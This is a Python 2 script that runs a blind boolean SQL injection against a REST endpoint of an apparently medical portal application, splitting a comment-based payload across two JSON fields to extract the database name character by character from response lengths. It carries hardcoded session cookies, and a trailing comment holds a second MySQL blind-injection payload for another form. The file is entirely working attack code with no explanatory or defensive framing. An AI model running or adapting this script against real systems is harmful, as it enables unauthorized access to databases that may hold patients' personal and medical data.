# -*- coding: iso-8859-1 -*-
## -*- coding: utf-8 -*-
import requests
import urllib3
urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "http://127.0.0.1:8080"
ftp_proxy   = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy,"https":https_proxy,"ftp": ftp_proxy}
url = 'http://dnmdewbl01/Dinamica.RestAPI/api/ConsultaOrdenEmpresa'

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0','Accept':'application/json, text/plain, */*','Accept-Language':'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','X-Requested-With':'XMLHttpRequest','Content-Type':'application/json; charset=utf-8','Referer':'http://dnmdewbl01/Dinamica/','Host':'dnmdewbl01'}
cookies = dict(TokenMus='pnKWfHvKPMoaIMkqaOeHiKtBt2vJKjCLTyC5qemsz/2tnH4Ua3KOaFdFxdOmTQgG',TIUsuarioPortales='AD9ZSUkTVfo=',IdUsuarioPorltales='MdkR1jVJCLOqRECXXGUs1Q==',DNICompania='+ph78LoCjb+Kcc/4Ib0Qug==',PerfilesCompania='KjQ2MTy3GkgIgtHXZs+9uWuX1DzD9EFb',RegistroMedico='Hw4sPgwRIdI=')

lista = ['@','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','_','-','!','$','.','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']

nombre = ''
print "Procesando..."
for x in range(1,18):
	for e in lista:	
		payload ='{"nit":"A8002561619","fechaInicio":"06/09/2015","fechaFin":"06/10/2015","nroRegistroMedico":"1254-95","regional":"0\'/*","nombresPaciente":"*/ AND \''+str(e)+'\'=(select substring(db_name(),'+str(x)+',1)) OR \'1\'=\'","apellidoPaciente":"","nroidPaciente":"","tipoIdPaciente":"","nroPagina":"1","nroRegistrosPorPagina":"100000"}'
		
		r = requests.post(url, data=payload, cookies=cookies, headers=headers,proxies=proxyDict,verify=False,allow_redirects=False)
		if r.headers['Content-Length'] == '1969':
			nombre = nombre + ' ' + e
			break
	x = x + 1	

print "\n El nombre de la base de datos es: " + nombre + "\n"









		# 'txtNombre=Seg&txtDescripcion=Segu&arrProcesos%5B%5D=1) AND (1=(SELECT 1 FROM Dual WHERE 1=(SELECT IF (ascii(substring((select database()),'+str(x)+',1))='+str(ord(e))+',true,false)))&arrColumnas%5B%5D=proceso&arrColumnas%5B%5D=activo&arrColumnas%5B%5D=descripcion&arrColumnas%5B%5D=ufisica&arrCriterios%5B%5D=ufisica&arrDatos%5Bufisica%5D%5B%5D=-1&seqReporteDinamico=0'







